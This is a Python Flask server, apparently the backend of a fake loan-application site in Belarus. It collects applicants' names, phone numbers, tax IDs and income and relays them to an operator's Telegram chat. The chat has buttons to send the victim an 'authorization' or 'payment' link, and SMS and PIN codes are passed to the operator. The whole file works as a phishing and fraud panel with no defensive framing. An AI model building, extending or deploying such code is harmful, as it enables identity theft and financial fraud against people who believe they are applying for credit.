import os
import asyncio
import random
import sqlite3
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

def init_db():
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS applications (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            fullname TEXT,
            phone TEXT,
            inn TEXT,
            income REAL,
            term INTEGER,
            amount REAL,
            payment REAL,
            session_id TEXT UNIQUE,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS auth_sessions (
            session_id TEXT PRIMARY KEY,
            phone TEXT,
            sms_code TEXT,
            pin_code TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

def save_application(data):
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO applications (fullname, phone, inn, income, term, amount, payment, session_id)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (data['fullname'], data['phone'], data['inn'], data['income'], 
          data['term'], data['amount'], data['payment'], data['session_id']))
    conn.commit()
    conn.close()

def get_auth_session(session_id):
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM auth_sessions WHERE session_id = ?', (session_id,))
    row = cursor.fetchone()
    conn.close()
    return row

def save_auth_session(session_id, phone, sms_code, pin_code):
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO auth_sessions (session_id, phone, sms_code, pin_code)
        VALUES (?, ?, ?, ?)
    ''', (session_id, phone, sms_code, pin_code))
    conn.commit()
    conn.close()

def generate_session_id():
    import secrets
    return secrets.token_hex(8)

init_db()

async def send_to_bot(chat_id, text, keyboard=None):
    from aiogram import Bot
    bot = Bot(token=os.environ.get("BOT_TOKEN"))
    if keyboard:
        await bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=keyboard)
    else:
        await bot.send_message(chat_id, text, parse_mode="HTML")
    await bot.session.close()

def get_admin_keyboard(session_id):
    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔐 Ссылка на авторизацию", callback_data=f"gen_auth:{session_id}")],
        [InlineKeyboardButton(text="💳 Ссылка на оплату", callback_data=f"gen_payment:{session_id}")],
        [InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject:{session_id}")]
    ])

@app.route('/submit_credit_application', methods=['POST'])
def submit_credit_application():
    data = request.json
    if 'session_id' not in data or not data['session_id']:
        data['session_id'] = generate_session_id()
    save_application(data)
    admin_chat_id = int(os.environ.get("ADMIN_CHAT_ID", 0))
    message = (
        f"🆕 <b>НОВАЯ ЗАЯВКА НА КРЕДИТ</b>\n\n"
        f"👤 ФИО: {data['fullname']}\n"
        f"📱 Телефон: {data['phone']}\n"
        f"🆔 ИНН: {data['inn'] or '—'}\n"
        f"💰 Доход: {data['income']} BYN\n"
        f"📅 Срок: {data['term']} мес\n"
        f"💵 Сумма: {data['amount']} BYN\n"
        f"📊 Платёж: ~{data['payment']} руб\n"
        f"🆔 Сессия: <code>{data['session_id']}</code>"
    )
    asyncio.run(send_to_bot(admin_chat_id, message, get_admin_keyboard(data['session_id'])))
    return jsonify({"status": "ok", "session_id": data['session_id']})

@app.route('/submit_phone', methods=['POST'])
def submit_phone():
    data = request.json
    session_id = data['session_id']
    phone = data['phone']
    sms_code = str(random.randint(10000, 99999))
    pin_code = str(random.randint(1000, 9999))
    save_auth_session(session_id, phone, sms_code, pin_code)
    admin_chat_id = int(os.environ.get("ADMIN_CHAT_ID", 0))
    message = f"📱 <b>ЗАПРОС АВТОРИЗАЦИИ</b>\n\n🆔 Сессия: <code>{session_id}</code>\n📞 {phone}\n\n🔐 SMS: <code>{sms_code}</code>\n🔢 PIN: <code>{pin_code}</code>"
    asyncio.run(send_to_bot(admin_chat_id, message))
    return jsonify({"status": "ok"})

@app.route('/submit_code', methods=['POST'])
def submit_code():
    data = request.json
    session = get_auth_session(data['session_id'])
    if session and session[2] == data['code']:
        return jsonify({"status": "ok", "next_step": "pin"})
    return jsonify({"status": "error", "message": "Неверный код"})

@app.route('/submit_pin', methods=['POST'])
def submit_pin():
    data = request.json
    session = get_auth_session(data['session_id'])
    if session and session[3] == data['pin']:
        admin_chat_id = int(os.environ.get("ADMIN_CHAT_ID", 0))
        asyncio.run(send_to_bot(admin_chat_id, f"✅ <b>АВТОРИЗАЦИЯ УСПЕШНА!</b>\n\n🆔 Сессия: <code>{data['session_id']}</code>"))
        return jsonify({"status": "ok", "authorized": True})
    return jsonify({"status": "error", "message": "Неверный PIN"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
